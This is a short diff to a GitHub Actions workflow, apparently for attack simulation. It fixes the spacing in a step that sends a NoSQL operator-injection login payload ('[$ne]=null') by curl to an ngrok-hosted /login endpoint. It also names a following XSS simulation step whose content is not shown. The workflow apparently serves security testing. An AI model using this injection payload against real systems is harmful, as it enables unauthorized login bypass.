@@ -16,7 +16,7 @@ jobs:
       - name: Simulate NoSQL Injection Attack
         run: |
           echo "Executing NoSQL Injection Attack..."
-          curl -X POSThttps://0ff9-102-152-223-44.ngrok-free.app/login        -H "X-Simulated-By: GitHubAction" \
+          curl -X POST https://0ff9-102-152-223-44.ngrok-free.app/login        -H "X-Simulated-By: GitHubAction" \
           -d 'username[$ne]=null&password[$ne]=null'
 
       - name: Simulate XSS Attack
